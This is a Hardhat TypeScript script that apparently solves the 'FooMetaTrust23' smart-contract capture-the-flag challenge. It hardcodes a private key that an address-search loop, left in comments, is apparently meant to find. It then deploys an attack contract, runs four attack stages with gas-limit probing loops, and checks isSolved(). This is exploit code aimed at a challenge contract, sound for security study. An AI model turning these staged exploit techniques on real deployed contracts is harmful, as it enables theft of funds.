import chalk from "chalk";
import { ethers } from "hardhat";
import { FooMetaTrust23__factory, FooMetaTrust23, FooAttackMetaTrust23__factory} from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let key = "0xf2b6c9639f151c02b3dac23920d699ef3792e75756db1e34cf141cc9ffe9b726";
    // let nonce = BigInt(0);
    // while (true) {
    //     let bytes = "0x" + randomBytes(32).toString('hex');
    //     let from = ethers.computeAddress(bytes);
    //     let contractAddress = ethers.getCreateAddress({from, nonce});
    //     if(ethers.getBigInt(contractAddress) % BigInt(1000) == BigInt(137)) {
    //         key = bytes;
    //         break;
    //     }
    // }
    log(`Private Key: ${key}`);
    let [fooContract, attacker] = await initialize<FooMetaTrust23>(FooMetaTrust23__factory, key);
    let attackContract = await new FooAttackMetaTrust23__factory(attacker).deploy();
    let tx = await attackContract.setup(await fooContract.getAddress());
    await tx.wait();

    let gasMax = 300000;
    while (true) {
      try {
        tx = await attackContract.stage1({gasLimit:gasMax});
        tx.wait();
        break;
      } catch {
        gasMax -= 100;
      }
    }
    gasMax = 100000;
    while (true) {
      try {
        tx = await attackContract.stage2(gasMax, {gasLimit:300000});
        tx.wait();
        log("Stage2 success");
        break;
      } catch(error) {
        // console.log(error);
        gasMax -= 1000;
        if (gasMax < 0) {
          log("Stage2 failed");
          break;
        }
      }      
    }
    
    tx = await attackContract.stage3();
    await tx.wait();

    tx = await attackContract.stage4();
    await tx.wait();

    log(`Is solved: ${chalk.yellow(await fooContract.isSolved())}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});